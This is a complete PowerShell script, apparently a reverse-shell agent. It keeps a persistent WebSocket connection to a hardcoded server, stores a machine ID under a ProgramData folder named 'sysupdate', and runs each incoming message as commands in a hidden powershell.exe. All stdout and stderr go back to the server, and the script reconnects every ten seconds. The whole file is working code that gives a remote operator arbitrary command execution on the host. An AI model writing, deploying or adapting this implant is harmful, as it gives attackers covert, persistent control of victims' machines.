# agent-ws.ps1 — Persistent WebSocket connection for remote shell
$ServerUrl = "ws://192.168.200.146:3000"  # Change to your server

# Stable machine ID (same logic as agent.ps1)
$MachineId = (Get-CimInstance Win32_BaseBoard).SerialNumber
if (-not $MachineId -or $MachineId -match "^\s*$|To be filled") {
    $IdFile = "$env:ProgramData\sysupdate\machine-id"
    if (Test-Path $IdFile) { $MachineId = Get-Content $IdFile }
    else {
        $MachineId = [System.Guid]::NewGuid().ToString()
        New-Item -ItemType Directory -Force -Path (Split-Path $IdFile) | Out-Null
        $MachineId | Set-Content $IdFile
    }
}

function Connect-Agent {
    while ($true) {
        try {
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $uri = [Uri]"$ServerUrl/ws/agent?id=$MachineId"
            $ws.ConnectAsync($uri, [Threading.CancellationToken]::None).Wait()
            Write-Host "WebSocket connected"

            $ps = $null
            $buffer = New-Object byte[] 4096

            while ($ws.State -eq 'Open') {
                $seg = New-Object ArraySegment[byte] $buffer
                $result = $ws.ReceiveAsync($seg, [Threading.CancellationToken]::None).Result

                if ($result.MessageType -eq 'Close') { break }

                $input = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)

                # Spawn PowerShell process if not running
                if (-not $ps -or $ps.HasExited) {
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = "powershell.exe"
                    $psi.Arguments = "-NoLogo -NoProfile -NonInteractive -Command -"
                    $psi.RedirectStandardInput = $true
                    $psi.RedirectStandardOutput = $true
                    $psi.RedirectStandardError = $true
                    $psi.UseShellExecute = $false
                    $psi.CreateNoWindow = $true
                    $ps = [System.Diagnostics.Process]::Start($psi)

                    # Background jobs to read stdout/stderr and send to server
                    $outReader = {
                        param($stream, $websocket)
                        while (-not $stream.EndOfStream) {
                            $line = $stream.ReadLine()
                            if ($websocket.State -eq 'Open') {
                                $bytes = [Text.Encoding]::UTF8.GetBytes("$line`r`n")
                                $seg = New-Object ArraySegment[byte] $bytes
                                $websocket.SendAsync($seg, 'Text', $true, [Threading.CancellationToken]::None).Wait()
                            }
                        }
                    }
                    $stdoutJob = [PowerShell]::Create().AddScript($outReader).AddArgument($ps.StandardOutput).AddArgument($ws)
                    $stderrJob = [PowerShell]::Create().AddScript($outReader).AddArgument($ps.StandardError).AddArgument($ws)
                    $stdoutJob.BeginInvoke() | Out-Null
                    $stderrJob.BeginInvoke() | Out-Null
                }

                # Send input to PowerShell
                $ps.StandardInput.WriteLine($input)
            }
        } catch {
            Write-Host "Connection error: $_ — reconnecting in 10s"
        } finally {
            if ($ps -and -not $ps.HasExited) { $ps.Kill() }
            if ($ws.State -eq 'Open') { $ws.CloseAsync('NormalClosure', '', [Threading.CancellationToken]::None).Wait() }
        }
        Start-Sleep -Seconds 10
    }
}

Connect-Agent
